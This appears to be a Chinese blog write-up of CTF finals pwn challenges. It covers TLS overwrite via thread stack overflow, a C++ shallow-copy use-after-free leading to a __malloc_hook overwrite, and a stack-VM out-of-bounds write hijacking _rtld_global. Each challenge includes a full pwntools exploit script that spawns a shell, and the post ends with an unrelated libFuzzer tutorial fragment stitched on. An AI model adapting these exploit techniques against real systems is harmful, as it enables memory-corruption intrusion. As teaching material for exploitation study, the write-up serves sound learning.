1234567891011121314unsigned __int64 __fastcall start_routine(void *a1){ char v2; // [rsp+0h] [rbp-40h] unsigned __int64 v3; // [rsp+38h] [rbp-8h] __int64 retaddr; // [rsp+48h] [rbp+8h] v3 = __readfsqword(0x28u); ret_address = (__int64)&amp;retaddr; save_ret = retaddr; gets(&amp;v2); __printf_chk(1LL, (__int64)&amp;v2); *(_QWORD *)ret_address = save_ret; return v3 - __readfsqword(0x28u);} __printf_chk函数会检测%n以及%()$()这样的的格式，因此只能用-%p-%p-这样泄露了。由于程序存在写回ret_addr的操作，导致栈溢出覆盖返回地址的方法失效了，这也是这道题的难点所在。 重点，记笔记：在线程中存在一种TSL机制：如果需要在一个线程内部的各个函数调用都能访问、但其它线程不能访问的变量（被称为static memory local to a thread 线程局部静态变量），就需要新的机制来实现，这就是TLS。我们熟知的canary就是存放在tls中，在ret时和stack中的canary比较。 其结构体为： 1234567891011121314151617181920212223242526272829typedef struct{ void *tcb; /* Pointer to the TCB. Not necessarily the thread descriptor used by libpthread. */ dtv_t *dtv; void *self; /* Pointer to the thread descriptor. */ int multiple_threads; int gscope_flag; uintptr_t sysinfo; uintptr_t stack_guard; /*canary uintptr_t pointer_guard; unsigned long int vgetcpu_cache[2]; /* Bit 0: X86_FEATURE_1_IBT. Bit 1: X86_FEATURE_1_SHSTK. */ unsigned int feature_1; int __glibc_unused1; /* Reservation of some values for the TM ABI. */ void *__private_tm[4]; /* GCC split stack support. */ void *__private_ss; /* The lowest address of shadow stack, */ unsigned long long int ssp_base; /* Must be kept even if it is no longer used by glibc since programs, like AddressSanitizer, depend on the size of tcbhead_t. */ __128bits __glibc_unused2[8][4] __attribute__ ((aligned (32))); void *__padding[8];} tcbhead_t; 在内存中如下： 12345678910111213141516171819202122rsp=0x7facd4d2bea8telescope 0x7facd4d2c700 10000:0000│ r8 r9 0x7facd4d2c700 ◂— 0x7facd4d2c70001:0008│ 0x7facd4d2c708 —▸ 0x563b164dc270 ◂— 0x102:0010│ 0x7facd4d2c710 —▸ 0x7facd4d2c700 ◂— 0x7facd4d2c70003:0018│ 0x7facd4d2c718 ◂— 0x104:0020│ 0x7facd4d2c720 ◂— 0x005:0028│ 0x7facd4d2c728 ◂— 0xfe0c23c58eab120006:0030│ 0x7facd4d2c730 ◂— 0x6bdca8fe08e79c207:0038│ 0x7facd4d2c738 ◂— 0x0... ↓58:02c0│ 0x7facd4d2c9c0 —▸ 0x7facd53382b0 (stack_used) ◂— 0x7facd4d2c9c0... ↓5a:02d0│ r10 0x7facd4d2c9d0 ◂— 0xb6c /* 'l\\x0b' */5b:02d8│ 0x7facd4d2c9d8 —▸ 0x7facd4d2c9e0 ◂— 0x7facd4d2c9e0... ↓5d:02e8│ 0x7facd4d2c9e8 ◂— 0xffffffffffffffe05e:02f0│ 0x7facd4d2c9f0 ◂— 0x0... ↓60:0300│ 0x7facd4d2ca00 —▸ 0x7facd4d2bf10 —▸ 0x7facd4d2c700 ◂— 0x7facd4d2c70061:0308│ 0x7facd4d2ca08 ◂— 0x0 可见,tls是在stack上的（比较下面）,可以通过大范围的栈溢出覆盖。 之后我们发送’a’*0x38+p64(canary)+’a’*0x400（大范围的覆盖）之后查看程序的流程变化： 123456789101112 0x563b14c06207 &lt;start_routine+110&gt; nop 0x563b14c06208 &lt;start_routine+111&gt; mov rax, qword ptr [rbp - 8] 0x563b14c0620c &lt;start_routine+115&gt; sub rax, qword ptr fs:[0x28] 0x563b14c06215 &lt;start_routine+124&gt; je start_routine+131 &lt;start_routine+131&gt; ↓ 0x563b14c0621c &lt;start_routine+131&gt; leave► 0x563b14c0621d &lt;start_routine+132&gt; ret &lt;0x7facd51256db; start_thread+219&gt; ↓ 0x7facd51256db &lt;start_thread+219&gt; mov qword ptr fs:[0x630], rax 0x7facd51256e4 &lt;start_thread+228&gt; call __call_tls_dtors@plt &lt;__call_tls_dtors@plt&gt; 0x7facd51256e9 &lt;start_thread+233&gt; xor eax, eax 其中__call_tls_dtors函数来析构线程本地存储，diassemble看下： 1234567891011121314151617181920212223242526272829pwndbg&gt; disassemble __call_tls_dtorsDump of assembler code for function __GI___call_tls_dtors: 0x00007facd4d70990 &lt;+0&gt;: push rbp 0x00007facd4d70991 &lt;+1&gt;: push rbx 0x00007facd4d70992 &lt;+2&gt;: sub rsp,0x8 0x00007facd4d70996 &lt;+6&gt;: mov rbp,QWORD PTR [rip+0x3a73c3] # 0x7facd5117d60 0x00007facd4d7099d &lt;+13&gt;: mov rbx,QWORD PTR fs:[rbp+0x0] 0x00007facd4d709a2 &lt;+18&gt;: test rbx,rbx 0x00007facd4d709a5 &lt;+21&gt;: je 0x7facd4d709ee &lt;__GI___call_tls_dtors+94&gt; 0x00007facd4d709a7 &lt;+23&gt;: nop WORD PTR [rax+rax*1+0x0] 0x00007facd4d709b0 &lt;+32&gt;: mov rdx,QWORD PTR [rbx+0x18] 0x00007facd4d709b4 &lt;+36&gt;: mov rax,QWORD PTR [rbx] 0x00007facd4d709b7 &lt;+39&gt;: mov rdi,QWORD PTR [rbx+0x8] 0x00007facd4d709bb &lt;+43&gt;: ror rax,0x11 0x00007facd4d709bf &lt;+47&gt;: xor rax,QWORD PTR fs:0x30 0x00007facd4d709c8 &lt;+56&gt;: mov QWORD PTR fs:[rbp+0x0],rdx 0x00007facd4d709cd &lt;+61&gt;: call rax 0x00007facd4d709cf &lt;+63&gt;: mov rax,QWORD PTR [rbx+0x10] 0x00007facd4d709d3 &lt;+67&gt;: lock sub QWORD PTR [rax+0x450],0x1 0x00007facd4d709dc &lt;+76&gt;: mov rdi,rbx 0x00007facd4d709df &lt;+79&gt;: call 0x7facd4d4e2c8 &lt;free@plt&gt; 0x00007facd4d709e4 &lt;+84&gt;: mov rbx,QWORD PTR fs:[rbp+0x0] 0x00007facd4d709e9 &lt;+89&gt;: test rbx,rbx 0x00007facd4d709ec &lt;+92&gt;: jne 0x7facd4d709b0 &lt;__GI___call_tls_dtors+32&gt; 0x00007facd4d709ee &lt;+94&gt;: add rsp,0x8 0x00007facd4d709f2 &lt;+98&gt;: pop rbx 0x00007facd4d709f3 &lt;+99&gt;: pop rbp 0x00007facd4d709f4 &lt;+100&gt;: retEnd of assembler dump. 其中，mov rbx,QWORD PTR fs:[rbp+0x0]使得我们通过栈溢出改写tls的内容（也即fs），进而控制rbx，使得其不跳转并继续往下执行。rax,QWORD PTR [rbx]，rax也可控，只是要经过ror rax,0x11和xor rax,QWORD PTR fs:0x30的运算后结果为one_gadget，之后call rax拿shell。因此我们就要提前布置好fs的内容。 exp: 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071from pwn import *context.arch='amd64'context.log_level='debug'def debug(addr,PIE=True): if PIE: text_base = int(os.popen(&quot;pmap {}| awk '{{print $1}}'&quot;.format(p.pid)).readlines()[1], 16) gdb.attach(p,'b *{}'.format(hex(text_base+addr))) else: gdb.attach(p,&quot;b *{}&quot;.format(hex(addr)))def rol(value): low = (value&amp;0xffff800000000000)&gt;&gt;47 hight = (value&amp;0x7fffffffffff)&lt;&lt;17 return hight | lowdef ror(value): hight = (value&amp;0x1ffff)&lt;&lt;47 low = (value&amp;0xfffffffffffe0000)&gt;&gt;17 return hight | lowdef main(host,port=9999): global p if host: p = remote(host,port) else: p = process(&quot;./pwn3&quot;) # p = process(&quot;./pwn&quot;,env={&quot;LD_PRELOAD&quot;:&quot;./x64_libc.so.6&quot;}) # gdb.attach(p,&quot;b *0x0000000000400A5F&quot;) debug(0x0000000000011F1) p.sendline(&quot;+%p-%p-%p-%p%-%p-%p-%p-%p%-%p-%p-%p-%p-%p+%p=&quot;) p.recvuntil('+') libc.address = int(p.recvuntil('-')[:-1],16) - 0x3ed8d0 info('libc : '+hex(libc.address)) p.recvuntil('+') canary = int(p.recvuntil('=')[:-1],16) info('canary : '+hex(canary)) sleep(0.3) payload = &quot;%p&quot;*(0x38/2)+p64(canary) p.sendline(payload) p.recvuntil(hex(libc.address-0x900)*2) p.recvuntil(&quot;0x&quot;) xor1 = int(p.recvuntil(&quot;0x&quot;)[:-2],16) p.recvuntil(&quot;(nil)(nil)&quot;) p.recvuntil(&quot;0x&quot;) p.recvuntil(&quot;0x&quot;) xor2 = int(p.recvuntil(&quot;0x&quot;)[:-2],16) # info(&quot;xor1: &quot; + hex(xor1)) info(&quot;xor2: &quot; + hex(xor2)) xor1 = libc.address-0x1100 sleep(0.3) one = 0x4f3c2 + libc.address payload = &quot;A&quot;*0x38+p64(canary)*2+p64(one) payload += p64(0)+p64(libc.address-0x900)*2 payload += p64(0)+p64(libc.address-0x1040)+p64(rol((ror(xor2)^xor1)^one)) payload += p64(0)*0xe8+p64(0x3ec560+libc.address)+p64(libc.address-0x248) payload += p64(libc.address-0x10d8)*0x10+p64(libc.address-0x10d8) p.sendline(payload) p.interactive()if __name__ == &quot;__main__&quot;: libc = ELF(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;,checksec=False) # libc = ELF(&quot;./x64_libc.so.6&quot;,checksec=False) # elf = ELF(&quot;./babyheap&quot;,checksec=False) main(args['REMOTE']) pwn4第二道就是一道C++的题目了，pwnable.tw上的原题CAOV。漏洞在于浅拷贝导致的析构函数会dele存在于stack上的指针，而这个指针指向的是我们的password结构，从而在我们可以利用chang_password()形成类似于UAF的效果。 漏洞代码： 123456789101112131415161718192021unsigned __int64 edit_info(){ __int64 v0; // rbx __int64 v1; // rax __int64 v2; // rax char v4; // [rsp+0h] [rbp-50h] char v5; // [rsp+20h] [rbp-30h] unsigned __int64 v6; // [rsp+38h] [rbp-18h] v6 = __readfsqword(0x28u); initial((__int64)&amp;v4); sub_401DDA((__int64)&amp;v5, (__int64)&amp;v4, (const char **)qword_6032A0); dele((__int64)&amp;v5); //bug v0 = sub_402164((__int64)&amp;v4); v1 = std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(&amp;std::cout, &quot;STUDENT: &quot;); v2 = std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(v1, v0); std::ostream::operator&lt;&lt;(v2, &amp;std::endl&lt;char,std::char_traits&lt;char&gt;&gt;); sub_401E6C(qword_6032A0); dele((__int64)&amp;v4); return __readfsqword(0x28u) ^ v6;} 效果展示： 1234567800:0000│ rsp 0x7ffc82d0fa50 —▸ 0x1985c60 ◂— 'PB19000001'01:0008│ 0x7ffc82d0fa58 ◂— 0x6400000064 /* 'd' */... ↓03:0018│ 0x7ffc82d0fa68 ◂— 0x21 /* '!' */04:0020│ rax rdi 0x7ffc82d0fa70 —▸ 0x6032f0 ◂— 0x005:0028│ 0x7ffc82d0fa78 ◂— 0x21 /* '!' */06:0030│ 0x7ffc82d0fa80 ◂— 0x007:0038│ 0x7ffc82d0fa88 ◂— 0x3fdc5116f3e23a00 位于rsp+0x20的位置存在的0x6032f0会被dele，由于我们提前change_password使得构造如下： 1234567891011pwndbg&gt; x/20gx 0x6032e00x6032e0: 0x0000000000000000 0x00000000000000710x6032f0: 0x0000000000000000 0x00000000000000000x603300: 0x0000000000000000 0x00000000000000000x603310: 0x0000000000000000 0x00000000000000000x603320: 0x0000000000000000 0x00000000000000000x603330: 0x0000000000000000 0x00000000000000000x603340: 0x0000000000000000 0x00000000000000000x603350: 0x0000000000000000 0x00000000000000210x603360: 0x00000000006032f0 0x00000000000000210x603370: 0x0000000000000000 0x0000000000000000 从而会将其dele到0x70的fastbin。 之后我们考虑如何泄露： 1234567891011121314151617180x603270: 0x0000000000000000 0x00000000000000000x603280 &lt;stderr&gt;: 0x00007f37cc70b540 0x00007f37cc70b6200x603290: 0x0000000000000000 0x00000000000000000x6032a0: 0x0000000001985c20 0x00000000000000000x6032b0: 0x0000000000000000 0x00000000000000000x6032c0: 0x0000006e696d6461 0x00000000000000000x6032d0: 0x0000000000000000 0x00000000000000000x6032e0: 0x0000000000000000 0x00000000000000710x6032f0: 0x0000000000000000 0x00000000000000000x603300: 0x0000000000000000 0x00000000000000000x603310: 0x0000000000000000 0x00000000000000000x603320: 0x0000000000000000 0x00000000000000000x603330: 0x0000000000000000 0x00000000000000000x603340: 0x0000000000000000 0x00000000000000000x603350: 0x0000000000000000 0x00000000000000210x603360: 0x00000000006032f0 0x00000000000000210x603370: 0x0000000000000000 0x0000000000000000 往上面看发现0x0000000001985c20为一个堆地址，其heap[0]位置的指针指向存放student’s name地址的地址，因此，我们可以通过UAF将堆申请到0x603280附件（正好有0x7f可以利用），然后修改0x0001985c20为一个存放read_got的地址，可以通过change_password实现。 效果： 123456789101112131415161718192021pwndbg&gt; x/30gx 0x6032e0-0x700x603270: 0x0000000000000000 0x00000000000000000x603280 &lt;stderr&gt;: 0x00007fa9e91f7540 0x00007fa9e91f76200x603290: 0x0000000000000000 0x00000000000000000x6032a0: 0x0000000000603300 0x00000000000000000x6032b0: 0x0000000000000000 0x00000000000000000x6032c0: 0x0000000000000000 0x00000000000000000x6032d0: 0x0000000000000000 0x00000000000000000x6032e0: 0x0000000000000000 0x00000000000000000x6032f0: 0x00000a0000000000 0x00000000000000000x603300: 0x0000000000602f38 0x41414141414141000x603310: 0x4141414141414141 0x41414141414141410x603320: 0x4141414141414141 0x41414141414141410x603330: 0x4141414141414141 0x41414141414141410x603340: 0x4141414141414141 0x41414141414141410x603350: 0x000000000000000a 0x0000000000000021pwndbg&gt; telescope 0x0000000000602f3800:0000│ 0x602f38 —▸ 0x7fa9e8f29310 (read) ◂— cmp dword ptr [rip + 0x2d2429], 001:0008│ 0x602f40 —▸ 0x7fa9e8f77b50 (__strncmp_sse42) ◂— test rdx, rdx02:0010│ 0x602f48 —▸ 0x7fa9e8e52750 (__libc_start_main) ◂— push r1403:0018│ 0x602f50 —▸ 0x7fa9e8e6c290 (__cxa_atexit) ◂— push r12 leak之后利用uaf打malloc_hook，拿shell。对了，add功能是通过edit info时修改name时的new实现的，dele功能是通过析构实现的。 ruan师傅的exp: 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117from pwn import *context.log_level='debug'context.arch='amd64'def cmd(c): p.recvuntil(&quot;choice:&quot;) p.sendline(str(c))def student(sno): p.recvuntil(&quot;please:&quot;) p.sendline(sno) p.sendlineafter(&quot;grade(0~100):&quot;,'1') for i in range(3): p.sendlineafter(&quot;grade:&quot;,'1')def main(host,port=1234): global p if host: p=remote(host,port) else: p=process(&quot;./pwn4&quot;) name_addr = 0x00000000006032E0 p.recvuntil(&quot;name:&quot;) p.sendline(&quot;admin&quot;) p.recvuntil(&quot;word:&quot;) p.send(&quot;p455w0rd&quot;) # gdb.attach(p) payload = &quot;&quot; payload += p64(0) + p64(0x71) payload = payload.ljust(0x70,&quot;\\x00&quot;) payload += p64(0) + p64(0x21) payload += p64(name_addr+0x10) + p64(0x21) cmd(1) p.recvuntil(&quot;word:&quot;) p.send(payload) student(&quot;aaa&quot;) cmd(2) p.recvuntil(&quot;word:&quot;) payload = p64(0) + p64(0x71) payload += p64(name_addr-0x5b) p.send(payload) cmd(1) p.recvuntil(&quot;word:&quot;) payload = '\\x00' p.send(payload) student(&quot;A&quot;*0x60) # gdb.attach(p) cmd(1) p.recvuntil(&quot;word:&quot;) payload = &quot;&quot; payload += p64(0) + p64(0x71) payload += p64(0)*2 payload += p64(0x0000000000602F38) p.send(payload) payload = &quot;\\x00&quot;*0xb+p64(name_addr+0x20) student(payload.ljust(0x60,&quot;\\x00&quot;)) # gdb.attach(p) cmd(1) p.recvuntil(&quot;word:&quot;) payload = '\\x00' p.send(payload) p.recvuntil(&quot;STUDENT: &quot;) libc.address = u64(p.recvuntil('\\n',drop=True).ljust(8,b&quot;\\x00&quot;))-libc.symbols[&quot;read&quot;] success('libc : '+hex(libc.address)) student(&quot;shabi&quot;) # gdb.attach(p) payload = &quot;&quot; payload += p64(0) + p64(0x71) payload += p64(name_addr+0x30)*12 payload += p64(0) + p64(0x21) payload += p64(name_addr+0x10) + p64(0x21) cmd(1) p.recvuntil(&quot;word:&quot;) p.send(payload) student(&quot;shabi&quot;) cmd(2) p.recvuntil(&quot;word:&quot;) payload = p64(0) + p64(0x71) payload += p64(libc.symbols[&quot;__malloc_hook&quot;]-0x23) p.send(payload) cmd(1) p.recvuntil(&quot;word:&quot;) payload = '\\x00' p.send(payload) student(p64(name_addr+0x30)*12) cmd(1) p.recvuntil(&quot;word:&quot;) payload = '\\x00' p.send(payload) one = 0xf1207+libc.address payload = &quot;\\x00&quot;*0xb+p64(0)+p64(one) student(payload.ljust(0x60,&quot;\\x00&quot;)) payload = &quot;&quot; payload += p64(0) + p64(0x71) payload += p64(name_addr+0x30)*12 payload += p64(0) + p64(0) payload += p64(name_addr) + p64(0) cmd(1) p.recvuntil(&quot;word:&quot;) p.send(payload) # gdb.attach(p) p.interactive()if __name__ == '__main__': libc = ELF(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;,checksec=False) main(args['REMOTE']) ruan师傅nb！！ stackmachine一道vm类型的题目，除了canary其他保护全开。程序首先初始化了sp,pc,stack,data,code段，之后输入data和code，然后run(常规的VM格式)。先来看下初始化的情况把： 123456pwndbg&gt; x/20xg 0x1c480000x1c48000: 0x0000000000000000 0x00000000000000510x1c48010: 0x0000000000000000 0x0000000000000800 //pc &amp; sp0x1c48020: 0x0000000001c48060 0x0000000000001000 //satck &amp; stack size0x1c48030: 0x0000000001c49070 0x0000000000001000 //data &amp; data size0x1c48040: 0x0000000001c4a080 0x0000000000001000 //code &amp; code size 接下来就是逆指令了，我只把有用到的指令代码显示了出来： 1234567891011121314151617181920212223242526272829303132333435363738case 1u: if ( vm-&gt;_sp &lt;= (unsigned __int64)(vm-&gt;stack_sz - 8) ) { *(_QWORD *)(8 * ((unsigned __int64)vm-&gt;_sp &gt;&gt; 3) + vm-&gt;stack) = *(_QWORD *)(8LL* (*(_QWORD *)(vm-&gt;stack+8 *((unsigned __int64)vm-&gt;_sp &gt;&gt; 3)) &gt;&gt; 3)+ vm-&gt;data); goto LABEL_56; } result = 0xFFFFFFFFLL; break;case 2u: if ( vm-&gt;_sp &lt;= (unsigned __int64)(vm-&gt;stack_sz - 16) )// stack-&gt;data { *(_QWORD *)(vm-&gt;data + 8LL * (*(_QWORD *)(vm-&gt;stack + 8 * ((unsigned __int64)vm-&gt;_sp &gt;&gt; 3)) &gt;&gt; 3)) = *(_QWORD *)(vm-&gt;stack + 8 * (((unsigned __int64)vm-&gt;_sp &gt;&gt; 3) + 1)); vm-&gt;_sp += 0x10LL; goto LABEL_56; } result = 0xFFFFFFFFLL; break;case 3u: if ( vm-&gt;_sp &lt;= (unsigned __int64)(vm-&gt;stack_sz - 16) ) { v2 = *(_QWORD *)(vm-&gt;stack + 8 * ((unsigned __int64)vm-&gt;_sp &gt;&gt; 3)) + *(_QWORD *)(vm-&gt;stack + 8 * (((unsigned __int64)vm-&gt;_sp &gt;&gt; 3) + 1)); vm-&gt;_sp += 8LL; *(_QWORD *)(8 * ((unsigned __int64)vm-&gt;_sp &gt;&gt; 3) + vm-&gt;stack) = v2; goto LABEL_56; } result = 0xFFFFFFFFLL; break;case 0xEu: if ( vm-&gt;_sp &gt; 7uLL ) { vm-&gt;_sp -= 8LL; *(_QWORD *)(8 * ((unsigned __int64)vm-&gt;_sp &gt;&gt; 3) + vm-&gt;stack) = *(_QWORD *)(vm-&gt;code + vm-&gt;_pc + 1); vm-&gt;_pc += 8LL; goto LABEL_56; } result = 0xFFFFFFFFLL; break; 解释一下0xe：将code段里数据放入stack段中,pc+=8（相当于push）。0x1：将以data为基地址以stack为偏移的地址的内容放入stack中。0x2：将stack顶的数据放入以data为基地址，以stack顶的后一个的数据为偏移的地址处。（由于stack的内容可控，因此存在越界写）。0x3：将stack里的两数相加并存入栈顶。 解体思路：1.通过观察初始的状态可以发现：data_ptr=0x01c49070,和该指针存在的结构体的位置：0x1c48030偏移为-0x1040，因此我们可以再开始时将stack中填入puts_got+offset(0x10000000000000000-0x1040),之后再执行2操作即可修改data_ptr为puts_got。 2.由于data_ptr被修改为puts_got,因此我们在stack里放入1作为偏移，再执行1操作即可将Libc里的地址写入stack里。 12345678910111213pwndbg&gt; x/20gx 0x8070000x807000: 0x0000000000000000 0x00000000000000510x807010: 0x000000000000001c 0x00000000000007f80x807020: 0x0000000000807060 0x00000000000010000x807030: 0x0000000000601fa0 0x00000000000010000x807040: 0x0000000000809080 0x00000000000010000x807050: 0x0000000000000000 0x00000000000010110x807060: 0x0000000000000000 0x00000000000000000x807070: 0x0000000000000000 0x00000000000000000x807080: 0x0000000000000000 0x00000000000000000x807090: 0x0000000000000000 0x0000000000000000pwndbg&gt; telescope 0x0000000000807060+0x7f800:0000│ rdx 0x807858 —▸ 0x7efdc21586a0 (puts) ◂— push r12 3.之后我们通过+运算将其改为one_gadget，然后再通过步骤2在stack里写入一个libc的地址，这个地址将作为后面的offset。 由于题目保护无法改写got表，ruan师傅教我了个新姿势： 1234567891011121314151617181920212223242526272829303132333435363738394041────────────────────────────────────────[ DISASM ]───────────────────────────────────────── 0x7f118c176b24 &lt;_dl_fini+52&gt; lea rcx, [rip + 0x215515] &lt;0x7f118c38c040&gt; 0x7f118c176b2b &lt;_dl_fini+59&gt; shl rax, 4 0x7f118c176b2f &lt;_dl_fini+63&gt; lea r12, [rcx + rax - 0x88] 0x7f118c176b37 &lt;_dl_fini+71&gt; jmp _dl_fini+119 &lt;_dl_fini+119&gt; ↓ 0x7f118c176b67 &lt;_dl_fini+119&gt; lea rdi, [rip + 0x215dda] &lt;0x7f118c38c948&gt; ► 0x7f118c176b6e &lt;_dl_fini+126&gt; call qword ptr [rip + 0x2163d4] &lt;rtld_lock_default_lock_recursive&gt; rdi: 0x7f118c38c948 (_rtld_global+2312) ◂— 0x0 rsi: 0x0 rdx: 0x7f118c176af0 (_dl_fini) ◂— push rbp rcx: 0x7f118c38c040 (_rtld_global) —▸ 0x7f118c38d168 ◂— 0x0 0x7f118c176b74 &lt;_dl_fini+132&gt; mov ecx, dword ptr [r12] 0x7f118c176b78 &lt;_dl_fini+136&gt; test ecx, ecx 0x7f118c176b7a &lt;_dl_fini+138&gt; je _dl_fini+80 &lt;_dl_fini+80&gt; 0x7f118c176b7c &lt;_dl_fini+140&gt; mov rax, qword ptr [r12 - 8] 0x7f118c176b81 &lt;_dl_fini+145&gt; movzx edx, byte ptr [rax + 0x315]─────────────────────────────────────────[ STACK ]─────────────────────────────────────────00:0000│ rsp 0x7ffe200d3a80 —▸ 0x7f118c161620 (_IO_2_1_stdout_) ◂— 0xfbad288701:0008│ 0x7ffe200d3a88 ◂— 0x102:0010│ 0x7ffe200d3a90 —▸ 0x7f118c1616a3 (_IO_2_1_stdout_+131) ◂— 0x162780000000000a /* '\\n' */03:0018│ 0x7ffe200d3a98 —▸ 0x7ffe200d3c30 ◂— 0x104:0020│ 0x7ffe200d3aa0 ◂— 0x005:0028│ 0x7ffe200d3aa8 —▸ 0x7f118be16419 (_IO_do_write+121) ◂— mov r13, rax06:0030│ 0x7ffe200d3ab0 —▸ 0x7ffe200d3c30 ◂— 0x107:0038│ 0x7ffe200d3ab8 —▸ 0x7f118c161620 (_IO_2_1_stdout_) ◂— 0xfbad2887───────────────────────────────────────[ BACKTRACE ]─────────────────────────────────────── ► f 0 7f118c176b6e _dl_fini+126 f 1 7f118bdd6008 __run_exit_handlers+232 f 2 7f118bdd6055 f 3 7f118bdbc847 __libc_start_main+247───────────────────────────────────────────────────────────────────────────────────────────pwndbg&gt; telescope 0x7f118c176b74+0x2163d400:0000│ 0x7f118c38cf48 (_rtld_global+3848) —▸ 0x7f118c166c90 (rtld_lock_default_lock_recursive) ◂— add dword ptr [rdi + 4], 101:0008│ 0x7f118c38cf50 (_rtld_global+3856) —▸ 0x7f118c166ca0 (rtld_lock_default_unlock_recursive) ◂— sub dword ptr [rdi + 4], 102:0010│ 0x7f118c38cf58 (_rtld_global+3864) —▸ 0x7f118c17a0e0 (_dl_make_stack_executable) ◂— push rbp03:0018│ 0x7f118c38cf60 (_rtld_global+3872) ◂— 0x604:0020│ 0x7f118c38cf68 (_rtld_global+3880) ◂— 0x105:0028│ 0x7f118c38cf70 (_rtld_global+3888) —▸ 0x7f118c3708f8 ◂— 0x40 /* '@' */ 在执行exit函数时，一直步入进去看到即将call的位置是rtld_lock_default_lock_recursive： 0x7f118c38cf48 (_rtld_global+3848) —▸ 0x7f118c166c90 (rtld_lock_default_lock_recursive)这种和got表的结构类似，因此我们只要改0x7f118c38cf48 (_rtld_global+3848)指向one_gadget即可拿shell，但这个地址是lib/x86_64-linux-gnu/ld-2.23.so里的地址，虽然本地是和libc基地址的偏移固定，但远程往往是不固定的，相差0x1000的整数倍，得通过爆破解决。 4.本地既然和libc偏移固定，就会和libc里的puts偏移固定，而0x0000000000601fa0又是一个固定的地址，因此只要通过’+’运算构造地址为0x7f118c38cf48 (_rtld_global+3848)-0x0000000000601fa0，最后执行2操作即可。 构造结果： 123pwndbg&gt; telescope 0x0000000000e10060+0x7f000:0000│ 0xe10850 ◂— 0x7f118bd8afa8 //offset01:0008│ 0xe10858 —▸ 0x7f118be8d207 (exec_comm+2263) //one_gadget exp： 1234567891011121314151617181920212223242526272829303132from pwn import *context.arch = 'amd64'context.log_level = 'debug'def main(host,port = 123): global p if host: p=remote(host,port) else: p=process(&quot;./StackMachine&quot;) gdb.attach(p) one = 0xf1207 offset=one-0x06f6a0 p.recvuntil(&quot;stack size &gt;&quot;) p.sendline(str(0x1000)) p.recvuntil(&quot;data size &gt;&quot;) p.sendline(str(0x1000)) p.recvuntil(&quot;initial data &gt;&quot;) p.sendline(str(-0x1040)) p.recvuntil(&quot;code size &gt;&quot;) p.sendline(str(0x1000)) p.recvuntil(&quot;initial code &gt;&quot;) # gdb.attach(p) # p.send(p8(0xe)+p64(0x601FA0)+p8(0xe)+p64(0x10000000000000000-0x1040)+p8(2)) p.send(p8(0xe)+p64(0x601FA0)+p8(0xe)+p64(0x10000000000000000-0x1040)+p8(2)+p8(0xe)+p64(1)+p8(1)+p8(0xe)+p64(offset)+p8(3)+p8(0xe)+p64(1)+p8(1)+p8(0xe)+p64(0x5812a8)+p8(3)+p8(0xe)+p64(0x10000000000000000-0x0000000000601fa0+0x600)+p8(3)+p8(2)) p.interactive()if __name__ == '__main__': libc=ELF(&quot;./libc.so.6&quot;) main(args['REMOTE'])","link":"/2020/09/26/%E5%9B%BD%E8%B5%9B_final%E6%88%98%E8%AE%B0/"},{"title":"（转）LibFuzzer workshop学习之路（一）","text":"文章首发于安全客，由安全客原创发布：https://www.anquanke.com/post/id/224823 LibFuzzer workshop学习之路（一） 最近做项目开始上手学习libfuzzer，是跟着libfuzzer-workshop学的。写下自己的心得和收获。 官方给出的定义 12LibFuzzer is in-process, coverage-guided, evolutionary fuzzing engine.LibFuzzer is linked with the library under test, and feeds fuzzed inputs to the library via a specific fuzzing entrypoint (aka “target function”); the fuzzer then tracks which areas of the code are reached, and generates mutations on the corpus of input data in order to maximize the code coverage. The code coverage information for libFuzzer is provided by LLVM’s SanitizerCoverage instrumentation. 简单来说就是通过与要进行fuzz的库连接，并将libfuzzer生成的输入通过模糊测试进入点(fuzz target)喂给要fuzz的库进行fuzz testing。同时fuzzer会跟踪哪些区域的代码已经被测试过的，并且根据种料库的输入进行变异来使得代码覆盖率最大化。代码覆盖率的信息是由LLVM’s SanitizerCoverage插桩提供的 需要注意的是这几个libfuzzer的特性：in-process指进程内。即libfuzzer在fuzz时并不是产生出多个进程来分别处理不同的输入，而是将所有的测试数据放入进程的内存空间中。coverage-guided指覆盖率指导的。即会进行代码覆盖率的计算，正如定义所说的使得不断增大代码覆盖率。evolutionary是指libfuzzer是进化型的fuzz，结合了产生和变异两种形式。 环境搭建：跟着https://github.com/Dor1s/libfuzzer-workshop 搭建就好了，主要是build llvm的环境可能要make一会儿。编译好后拿到libfuzzer.a(静态链接库文件)，就可以开始上手实践了。 fuzz testinglibfuzzer已经提供了数据样本生成和异常检测功能，我们要做的就是要实现模糊测试进入点(fuzz target)，将libfuzzer生成的数据交给目标程序处理。fuzz target编写模板： 12345// fuzz_target.ccextern &quot;C&quot; int LLVMFuzzerTestOneInput(const uint8_t *Data, size_t Size) { DoSomethingInterestingWithMyAPI(Data, Size); return 0; // Non-zero return values are reserved for future use.} 需要注意的是LLVMFuzzerTestOneInput函数即使我们要实现的接口函数，他的两个参数Data(libfuzzer的测试样本数据)，size(样本数据的大小)。DoSomethingInterestingWithMyAPI函数即我们实际要进行fuzz的函数。 编译.cc文件：123clang++ -g -O1 -fsanitize=fuzzer,address \\fuzz_target.cc ../../libFuzzer/Fuzzer/libFuzzer.a \\-o fuzzer_target 几个参数：-g 可选参数，保留调试符号。-O1 指定优化等级为1-fsanitize 指定sanitize。fuzzer是必须的，用来启用libfuzzer。还可以附加的其他sanitize有：address(用来检测内存访问相关的错误，如stack_overflow,heap_overflow,uaf,可以与fuzzer一起使用)；memory(检测未初始化内存的访问，应单独使用)；undefined(检测其他的漏洞，如整数溢出，类型混淆等未定义的漏洞)注：-fsanitize-coverage=trace-pc-guard选项在高版本的clang中已不再适用，代码的覆盖率情况默认自动开启。 这一步骤整体过程就是通过clang的-fsanitize=fuzzer选项可以启用libFuzzer，这个选项在编译和链接过程中生效，实现了条件判断语句和分支执行的记录，并且辅以libFuzzer中的库函数(libfuzzer.a)，通过生成不同的测试样例然后能够获得代码的覆盖率情况，最终实现所谓的fuzz testing。 开始fuzz先来lesson 04，要测试的库是vulnerable_functions.h：123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475// Copyright 2016 Google Inc. All Rights Reserved.// Licensed under the Apache License, Version 2.0 (the 